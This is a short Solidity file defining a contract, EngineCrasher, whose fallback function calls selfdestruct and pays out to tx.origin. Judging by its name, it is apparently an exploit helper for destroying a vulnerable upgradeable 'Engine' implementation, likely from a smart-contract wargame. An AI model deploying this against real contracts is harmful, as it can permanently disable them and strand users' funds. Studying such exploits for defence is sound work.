// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EngineCrasher {
    fallback() external payable {
        selfdestruct(payable(tx.origin));
    }
}
